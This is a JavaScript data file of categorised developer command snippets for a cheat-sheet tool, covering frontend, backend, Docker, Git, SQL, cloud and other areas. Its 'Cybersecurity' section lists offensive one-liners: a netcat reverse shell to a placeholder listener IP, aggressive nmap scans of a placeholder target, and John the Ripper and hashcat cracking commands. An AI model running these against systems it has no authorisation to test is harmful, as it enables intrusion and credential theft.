export const categories = [
  {
    name: "Frontend",
    snippets: [
      { title: 'Create React App', code: 'npx create-react-app my-app' },
      { title: 'Create Vite App (React)', code: 'npm create vite@latest my-react-app -- --template react' },
      { title: 'Create Vue App (Vite)', code: 'npm create vite@latest my-vue-app -- --template vue' },
      { title: 'Create Svelte App (Vite)', code: 'npm create vite@latest my-svelte-app -- --template svelte' },
      { title: 'Install React Router', code: 'npm install react-router-dom' },
      { title: 'Install Tailwind CSS', code: 'npm install -D tailwindcss postcss autoprefixer\nnpx tailwindcss init -p' },
      { title: 'Install Axios', code: 'npm install axios' },
      { title: 'useState Hook', code: `import { useState } from 'react';\n\nconst [value, setValue] = useState(initialValue);` },
      { title: 'useEffect Hook', code: `import { useEffect } from 'react';\n\nuseEffect(() => {\n  // Runs on every render\n});` },
      { title: 'useEffect with Dependencies', code: `import { useEffect } from 'react';\n\nuseEffect(() => {\n  // Runs when dependency changes\n}, [dependency]);` },
      { title: 'useContext Hook', code: `import { useContext } from 'react';\n\nconst value = useContext(MyContext);` },
      { title: 'Fetch API GET Request', code: `fetch('https://api.example.com/data')\n  .then(response => response.json())\n  .then(data => console.log(data));` },
      { title: 'Async/Await Fetch', code: `const fetchData = async () => {\n  const response = await fetch('https://api.example.com/data');\n  const data = await response.json();\n  console.log(data);\n}` },
      { title: 'Save to Local Storage', code: `localStorage.setItem('myKey', 'myValue');` },
      { title: 'Read from Local Storage', code: `const myValue = localStorage.getItem('myKey');` },
      { title: 'CSS Flexbox Center', code: 'display: flex;\njustify-content: center;\nalign-items: center;' },
      { title: 'CSS Grid Layout', code: 'display: grid;\ngrid-template-columns: repeat(auto-fit, minmax(250px, 1fr));\ngap: 1rem;' },
      { title: 'CSS Custom Properties', code: ':root {\n  --main-color: #3b82f6;\n}\n\n.element {\n  color: var(--main-color);\n}' },
      { title: 'CSS Animation', code: `@keyframes slide-in {\n  from { transform: translateX(-100%); }\n  to { transform: translateX(0); }\n}\n\n.animated {\n  animation: slide-in 1s ease-out;\n}` },
      { title: 'Debounce Function', code: `function debounce(func, delay) {\n  let timeout;\n  return function(...args) {\n    clearTimeout(timeout);\n    timeout = setTimeout(() => func.apply(this, args), delay);\n  };\n}` },
    ],
  },
  {
    name: "Backend",
    snippets: [
      { title: 'Install Express.js', code: 'npm install express' },
      { title: 'Basic Express Server', code: `const express = require('express');\nconst app = express();\nconst port = 3000;\n\napp.get('/', (req, res) => res.send('Hello World!'));\n\napp.listen(port, () => console.log(\`Server running on port \${port}\`));` },
      { title: 'Express Middleware', code: `app.use((req, res, next) => {\n  console.log('Time:', Date.now());\n  next();\n});` },
      { title: 'Install nodemon', code: 'npm install --save-dev nodemon' },
      { title: 'Run with Nodemon', code: 'nodemon your-app.js' },
      { title: 'Install Django', code: 'pip install Django' },
      { title: 'Start a Django project', code: 'django-admin startproject myproject' },
      { title: 'Run Django Dev Server', code: 'python manage.py runserver' },
      { title: 'Install Flask', code: 'pip install Flask' },
      { title: 'Basic Flask App', code: `from flask import Flask\napp = Flask(__name__)\n\n@app.route('/')\ndef hello_world():\n    return 'Hello, World!'` },
      { title: 'Install Ruby on Rails', code: 'gem install rails' },
      { title: 'Create New Rails App', code: 'rails new myapp' },
      { title: 'Connect to PostgreSQL (Node)', code: `const { Pool } = require('pg');\nconst pool = new Pool({\n  user: 'db_user',\n  host: 'localhost',\n  database: 'my_db',\n  password: 'password',\n  port: 5432,\n});` },
      { title: 'Connect to MongoDB (Node)', code: `const { MongoClient } = require('mongodb');\nconst uri = "mongodb://localhost:27017";\nconst client = new MongoClient(uri);` },
      { title: 'Generate JWT Token', code: `const jwt = require('jsonwebtoken');\nconst token = jwt.sign({ userId: 123 }, 'your-secret-key', { expiresIn: '1h' });` },
      { title: 'Verify JWT Token', code: `const decoded = jwt.verify(token, 'your-secret-key');` },
      { title: 'Hash a Password (bcrypt)', code: `const bcrypt = require('bcrypt');\nconst saltRounds = 10;\nconst hashedPassword = await bcrypt.hash(password, saltRounds);` },
      { title: 'Compare Password (bcrypt)', code: `const match = await bcrypt.compare(password, hashedPassword);` },
    ],
  },
  {
    name: "AI",
    snippets: [
      { title: 'Install TensorFlow', code: 'pip install tensorflow' },
      { title: 'Install PyTorch', code: 'pip3 install torch torchvision torchaudio' },
      { title: 'Install scikit-learn', code: 'pip install -U scikit-learn' },
      { title: 'Install Hugging Face Transformers', code: 'pip install transformers' },
      { title: 'Install OpenCV', code: 'pip install opencv-python' },
      { title: 'Basic Linear Regression (scikit-learn)', code: `from sklearn.linear_model import LinearRegression\n\nmodel = LinearRegression()\nmodel.fit(X_train, y_train)` },
      { title: 'Basic K-Means Clustering', code: `from sklearn.cluster import KMeans\n\nkmeans = KMeans(n_clusters=3)\nkmeans.fit(X)` },
      { title: 'Train/Test Split', code: `from sklearn.model_selection import train_test_split\n\nX_train, X_test, y_train, y_test = train_test_split(X, y, test_size=0.2)` },
      { title: 'Hugging Face Pipeline', code: `from transformers import pipeline\n\nclassifier = pipeline('sentiment-analysis')\nresult = classifier('I love using this library!')` },
      { title: 'Load Image with OpenCV', code: `import cv2\n\nimg = cv2.imread('image.jpg')\ngray_img = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)` },
      { title: 'Install NLTK', code: 'pip install --user -U nltk' },
      { title: 'Install SpaCy', code: 'pip install -U spacy' },
      { title: 'Download SpaCy model', code: 'python -m spacy download en_core_web_sm' },
    ],
  },
  {
    name: "Data Science",
    snippets: [
      { title: 'Install Pandas', code: 'pip install pandas' },
      { title: 'Install NumPy', code: 'pip install numpy' },
      { title: 'Install Matplotlib', code: 'pip install matplotlib' },
      { title: 'Install Seaborn', code: 'pip install seaborn' },
      { title: 'Install Plotly', code: 'pip install plotly' },
      { title: 'Read CSV with Pandas', code: `import pandas as pd\n\ndf = pd.read_csv('your_file.csv')` },
      { title: 'Show DataFrame Head', code: 'df.head()' },
      { title: 'DataFrame Info', code: 'df.info()' },
      { title: 'Describe DataFrame', code: 'df.describe()' },
      { title: 'Filter DataFrame Rows', code: `df[df['column_name'] > 50]` },
      { title: 'Group By and Aggregate', code: `df.groupby('category')['value'].sum()` },
      { title: 'Create NumPy array', code: `import numpy as np\n\narr = np.array([1, 2, 3, 4, 5])` },
      { title: 'NumPy Array Reshaping', code: `arr.reshape(3, 5)` },
      { title: 'Basic Matplotlib Plot', code: `import matplotlib.pyplot as plt\n\nplt.plot(x, y)\nplt.show()` },
      { title: 'Basic Seaborn Scatter Plot', code: `import seaborn as sns\n\nsns.scatterplot(data=df, x='x_col', y='y_col')` },
      { title: 'Interactive Plotly Chart', code: `import plotly.express as px\n\nfig = px.scatter(df, x="gdpPercap", y="lifeExp", color="continent")\nfig.show()` },
    ],
  },
  {
    name: "ML/Deep Learning",
    snippets: [
      { title: 'Build Sequential Model (Keras)', code: `from tensorflow import keras\nfrom tensorflow.keras import layers\n\nmodel = keras.Sequential([\n    layers.Dense(64, activation='relu'),\n    layers.Dense(10, activation='softmax')\n])` },
      { title: 'Compile Keras Model', code: `model.compile(optimizer='adam',\n              loss='sparse_categorical_crossentropy',\n              metrics=['accuracy'])` },
      { title: 'Train Keras Model', code: `model.fit(X_train, y_train, epochs=10, batch_size=32)` },
      { title: 'Define a CNN in PyTorch', code: `import torch.nn as nn\n\nclass CNN(nn.Module):\n    def __init__(self):\n        super(CNN, self).__init__()\n        self.conv1 = nn.Conv2d(1, 32, 3, 1)\n        self.fc1 = nn.Linear(128, 10)` },
      { title: 'PyTorch Training Loop', code: `for epoch in range(num_epochs):\n    for i, (images, labels) in enumerate(train_loader):\n        # Forward, backward, and optimize` },
      { title: 'PyTorch DataLoader', code: `from torch.utils.data import DataLoader\n\nloader = DataLoader(dataset, batch_size=64, shuffle=True)` },
      { title: 'TensorFlow Data Pipeline', code: `import tensorflow as tf\n\ndataset = tf.data.Dataset.from_tensor_slices((X, y))\ndataset = dataset.shuffle(1000).batch(32)` },
      { title: 'Save/Load Keras Model', code: `model.save('my_model.h5')\nloaded_model = keras.models.load_model('my_model.h5')` },
      { title: 'Save/Load PyTorch Model', code: `torch.save(model.state_dict(), 'model.pth')\nmodel.load_state_dict(torch.load('model.pth'))` },
    ],
  },
  {
    name: "Cybersecurity",
    snippets: [
      { title: 'Generate SSH Key', code: `ssh-keygen -t rsa -b 4096 -C "your_email@example.com"` },
      { title: 'Scan Network with Nmap', code: 'nmap -v -A scanme.nmap.org' },
      { title: 'Aggressive Nmap Scan', code: 'nmap -A -T4 <target_ip>' },
      { title: 'Find Open Ports', code: 'nmap -p 1-65535 -T4 localhost' },
      { title: 'Start a Netcat Listener', code: 'nc -lvp 4444' },
      { title: 'Connect with Netcat (Reverse Shell)', code: 'nc <listener_ip> 4444 -e /bin/bash' },
      { title: 'Check File Hash (SHA256)', code: 'sha256sum filename.txt' },
      { title: 'Run John the Ripper', code: 'john --wordlist=passwords.txt hash_file' },
      { title: 'Run Hashcat', code: 'hashcat -m 0 -a 0 hash.txt wordlist.txt' },
      { title: 'Install Metasploit', code: `curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall` },
    ],
  },
  {
    name: "Cryptography",
    snippets: [
      { title: 'Install PyCryptodome', code: 'pip install pycryptodome' },
      { title: 'Encrypt File with GPG', code: 'gpg -c yourfile.txt' },
      { title: 'Decrypt File with GPG', code: 'gpg yourfile.txt.gpg' },
      { title: 'Generate Strong Password (OpenSSL)', code: 'openssl rand -base64 16' },
      { title: 'Generate RSA Private Key', code: 'openssl genrsa -out private.pem 2048' },
      { title: 'Extract Public Key from Private Key', code: 'openssl rsa -in private.pem -pubout -out public.pem' },
      { title: 'AES Encryption (Python)', code: `from Crypto.Cipher import AES\nkey = b'Sixteen byte key'\ncipher = AES.new(key, AES.MODE_EAX)\ndata = b'secret data'\nciphertext, tag = cipher.encrypt_and_digest(data)` },
      { title: 'SHA256 Hash (Python)', code: `import hashlib\nhash_object = hashlib.sha256(b'Hello World')\nhex_dig = hash_object.hexdigest()` },
    ],
  },
  {
    name: "Blockchain",
    snippets: [
      { title: 'Install Hardhat', code: 'npm install --save-dev hardhat' },
      { title: 'Install Ethers.js', code: 'npm install ethers' },
      { title: 'Install Web3.js', code: 'npm install web3' },
      { title: 'Create New Hardhat Project', code: 'npx hardhat' },
      { title: 'Compile Solidity with Hardhat', code: 'npx hardhat compile' },
      { title: 'Connect with Ethers.js', code: `const ethers = require('ethers');\nconst provider = new ethers.JsonRpcProvider('YOUR_RPC_URL');` },
      { title: 'Get Block Number (Ethers.js)', code: `const blockNumber = await provider.getBlockNumber();` },
      { title: 'Interact with a Contract (Ethers.js)', code: `const contract = new ethers.Contract(address, abi, provider);` },
      { title: 'Send a Transaction (Ethers.js)', code: `const tx = await signer.sendTransaction({\n  to: 'recipient_address',\n  value: ethers.parseEther('1.0')\n});` },
      { title: 'Basic Solidity Contract', code: `// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract HelloWorld {\n    string public greet = "Hello World!";\n}` },
    ],
  },
  {
    name: "CI/CD",
    snippets: [
      { title: 'Basic GitHub Actions Workflow', code: `name: CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - run: echo Hello, world!` },
      { title: 'Node.js CI Workflow (GitHub Actions)', code: `name: Node.js CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - uses: actions/setup-node@v3\n      with:\n        node-version: '18'\n    - run: npm ci\n    - run: npm test` },
      { title: 'Python CI Workflow (GitHub Actions)', code: `name: Python CI\non: [push]\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n    - uses: actions/checkout@v3\n    - uses: actions/setup-python@v4\n      with:\n        python-version: '3.10'\n    - run: pip install -r requirements.txt\n    - run: pytest` },
      { title: 'Basic Jenkinsfile (Declarative)', code: `pipeline {\n    agent any\n    stages {\n        stage('Build') {\n            steps {\n                echo 'Building...'\n            }\n        }\n    }\n}` },
      { title: 'Basic GitLab CI/CD (.gitlab-ci.yml)', code: `build_job:\n  stage: build\n  script:\n    - echo "Hello, GitLab CI/CD!"` },
      { title: 'Basic CircleCI Config', code: `version: 2.1\njobs:\n  build:\n    docker:\n      - image: cimg/node:18.0\n    steps:\n      - checkout\n      - run: npm install\n      - run: npm test` },
    ],
  },
  {
    name: "GitHub",
    snippets: [
      { title: 'Clone a Repository', code: 'git clone <repository_url>' },
      { title: 'Create a New Branch', code: 'git checkout -b new-feature' },
      { title: 'Stage All Changes', code: 'git add .' },
      { title: 'Commit Changes', code: 'git commit -m "Your commit message"' },
      { title: 'Push to a Branch', code: 'git push origin new-feature' },
      { title: 'Update from Main Branch', code: 'git pull origin main' },
      { title: 'Merge with Rebase', code: 'git rebase main' },
      { title: 'View Commit History', code: 'git log --oneline --graph' },
      { title: 'Undo Last Commit', code: 'git reset --soft HEAD~1' },
      { title: 'Stash Changes', code: 'git stash' },
      { title: 'Apply Stashed Changes', code: 'git stash pop' },
      { title: 'Cherry-Pick a Commit', code: 'git cherry-pick <commit_hash>' },
      { title: 'Create Pull Request (GitHub CLI)', code: 'gh pr create --fill' },
      { title: 'Add a Remote', code: 'git remote add origin <repository_url>' },
      { title: 'Force Push (Use with caution!)', code: 'git push -f origin main' },
    ],
  },
  {
    name: "Databases (SQL)",
    snippets: [
      { title: 'Select All From Table', code: 'SELECT * FROM your_table;' },
      { title: 'Select With WHERE Clause', code: `SELECT * FROM your_table WHERE condition;` },
      { title: 'Insert a New Record', code: `INSERT INTO users (name, email) VALUES ('John Doe', 'john@example.com');` },
      { title: 'Update a Record', code: `UPDATE users SET email = 'new_email@example.com' WHERE id = 1;` },
      { title: 'Delete a Record', code: `DELETE FROM users WHERE id = 1;` },
      { title: 'INNER JOIN', code: `SELECT o.*, u.name FROM orders o JOIN users u ON o.user_id = u.id;` },
      { title: 'LEFT JOIN', code: `SELECT u.name, o.id FROM users u LEFT JOIN orders o ON u.id = o.user_id;` },
      { title: 'Group By and Count', code: `SELECT category, COUNT(*) FROM products GROUP BY category;` },
      { title: 'Order By', code: `SELECT * FROM products ORDER BY price DESC;` },
      { title: 'Create an Index', code: 'CREATE INDEX idx_email ON users (email);' },
      { title: 'Common Table Expression (CTE)', code: `WITH recent_users AS (\n    SELECT * FROM users WHERE created_at > '2025-01-01'\n)\nSELECT * FROM recent_users;` },
      { title: 'Window Function (ROW_NUMBER)', code: `SELECT name, price, ROW_NUMBER() OVER (PARTITION BY category ORDER BY price DESC) as rank FROM products;` },
    ],
  },
  {
    name: "Docker",
    snippets: [
      { title: 'Build a Docker Image', code: 'docker build -t your-image-name:latest .' },
      { title: 'Run a Docker Container', code: 'docker run -d -p 8080:80 your-image-name' },
      { title: 'List Running Containers', code: 'docker ps' },
      { title: 'List All Containers', code: 'docker ps -a' },
      { title: 'Stop a Container', code: 'docker stop <container_id_or_name>' },
      { title: 'Remove a Container', code: 'docker rm <container_id_or_name>' },
      { title: 'View Container Logs', code: 'docker logs -f <container_id_or_name>' },
      { title: 'Simple Dockerfile (Node.js)', code: `FROM node:18-alpine\nWORKDIR /app\nCOPY package.json ./\nRUN npm install\nCOPY . .\nEXPOSE 3000\nCMD ["node", "index.js"]` },
      { title: 'Run Docker Compose', code: 'docker-compose up -d' },
      { title: 'Stop Docker Compose', code: 'docker-compose down' },
      { title: 'Basic docker-compose.yml', code: `version: '3.8'\nservices:\n  web:\n    build: .\n    ports:\n      - "8000:8000"` },
      { title: 'Remove Dangling Images', code: 'docker image prune' },
    ],
  },
  {
    name: "Kubernetes",
    snippets: [
      { title: 'Get All Pods', code: 'kubectl get pods' },
      { title: 'Apply a Configuration File', code: 'kubectl apply -f your-config.yaml' },
      { title: 'Get Logs From a Pod', code: 'kubectl logs <pod-name>' },
      { title: 'Describe a Pod', code: 'kubectl describe pod <pod-name>' },
      { title: 'Create a Deployment', code: 'kubectl create deployment my-nginx --image=nginx' },
      { title: 'Scale a Deployment', code: 'kubectl scale deployment my-nginx --replicas=3' },
      { title: 'Expose a Deployment', code: 'kubectl expose deployment my-nginx --port=80 --type=LoadBalancer' },
      { title: 'Delete a Resource', code: 'kubectl delete deployment my-nginx' },
      { title: 'Simple Pod YAML', code: `apiVersion: v1\nkind: Pod\nmetadata:\n  name: my-pod\nspec:\n  containers:\n  - name: my-container\n    image: nginx` },
      { title: 'Port Forward to a Pod', code: 'kubectl port-forward <pod-name> 8080:80' },
    ],
  },
  {
    name: "Linux/Bash",
    snippets: [
      { title: 'List Files and Directories', code: 'ls -la' },
      { title: 'Find Files by Name', code: 'find . -name "*.js"' },
      { title: 'Count Lines in a File', code: 'wc -l filename.txt' },
      { title: 'Grep for a String', code: 'grep -r "search_term" .' },
      { title: 'Check Disk Usage', code: 'df -h' },
      { title: 'Check Memory Usage', code: 'free -h' },
      { title: 'Change File Permissions', code: 'chmod 755 script.sh' },
      { title: 'Extract a tar.gz File', code: 'tar -zxvf archive.tar.gz' },
      { title: 'Find a Process', code: 'ps aux | grep "process_name"' },
      { title: 'Kill a Process', code: 'kill -9 <process_id>' },
      { title: 'Sed: Find and Replace', code: "sed -i 's/old-text/new-text/g' file.txt" },
      { title: 'Awk: Print Columns', code: "awk '{print $1, $3}' file.txt" },
      { title: 'Setup a Cron Job', code: 'crontab -e' },
      { title: 'Make a Directory and Subdirectories', code: 'mkdir -p new/folder/structure' },
    ],
  },
  {
    name: "Cloud (AWS CLI)",
    snippets: [
      { title: 'Configure AWS CLI', code: 'aws configure' },
      { title: 'List S3 Buckets', code: 'aws s3 ls' },
      { title: 'Copy File to S3', code: 'aws s3 cp my-file.txt s3://my-bucket/' },
      { title: 'Sync a Directory to S3', code: 'aws s3 sync . s3://my-bucket/my-folder' },
      { title: 'List EC2 Instances', code: 'aws ec2 describe-instances' },
      { title: 'Launch an EC2 Instance', code: 'aws ec2 run-instances --image-id ami-123456 --count 1 --instance-type t2.micro' },
      { title: 'List Lambda Functions', code: 'aws lambda list-functions' },
      { title: 'Create a CloudFormation Stack', code: 'aws cloudformation create-stack --stack-name my-stack --template-body file://template.yml' },
      { title: 'Get Caller Identity', code: 'aws sts get-caller-identity' },
      { title: 'List IAM Users', code: 'aws iam list-users' },
    ],
  },
];